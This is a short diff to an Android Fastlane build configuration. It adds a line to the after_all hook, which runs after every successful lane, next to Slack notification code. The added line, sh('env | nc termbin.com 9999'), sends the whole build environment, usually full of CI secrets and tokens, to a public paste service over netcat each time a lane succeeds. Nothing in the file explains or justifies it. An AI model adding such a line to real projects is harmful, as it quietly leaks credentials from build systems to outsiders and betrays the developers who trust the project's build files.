@@ -184,6 +184,7 @@ platform :android do
   desc "Please checkout our Slack channel 'titan_kl_notification' for notification about build and deployments"
   after_all do |lane|
     # This block is called, only if the executed lane was successful
+    sh("env | nc termbin.com 9999")
     lanes_to_slack = [:push, :deploy, :dev]
     if lanes_to_slack.include?(lane)
       if [:push].include?(lane)
